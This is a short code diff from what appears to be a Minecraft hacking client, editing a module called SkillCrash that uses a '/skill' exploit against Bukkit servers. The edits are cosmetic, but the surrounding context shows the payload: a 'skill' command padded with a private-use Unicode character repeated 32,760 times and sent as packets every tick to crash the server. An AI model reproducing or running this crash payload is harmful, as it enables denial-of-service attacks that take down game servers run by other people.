@@ -1,8 +1,8 @@
 package com.tricrotism.modules.crash;
 
 import com.tricrotism.SageFang;
-import com.tricrotism.api.menus.Menu;
 import com.tricrotism.api.eventbus.EventHandler;
+import com.tricrotism.api.menus.Menu;
 import com.tricrotism.api.modules.Module;
 import com.tricrotism.events.game.GameQuitEvent;
 import com.tricrotism.events.world.TickEvent;
@@ -18,7 +18,7 @@ public class SkillCrash extends Module implements Menu {
     public static final SkillCrash instance = new SkillCrash();
 
     public SkillCrash() {
-        super("skillcrash", "Skill Crash", "Using the '/skill' exploit in base Bukkit installs.");
+        super("skillcrash", "Skill Crash", "Using the '/skill' exploit in base Bukkit installs.", "Combat");
     }
 
     @EventHandler
@@ -33,8 +33,8 @@ public class SkillCrash extends Module implements Menu {
         int skillCrashBuffer = Config.getInt(baseConfig + ".buffer", 32760);
 
         SageFang.LOGGER.info("Skill crash activated! Sending {} packets with buffer size {}",
-                packetsPerTick,
-                skillCrashBuffer);
+            packetsPerTick,
+            skillCrashBuffer);
 
         ClientPacketListener handler = mc.getConnection();
         String spam = "skill " + "\uE400".repeat(skillCrashBuffer);
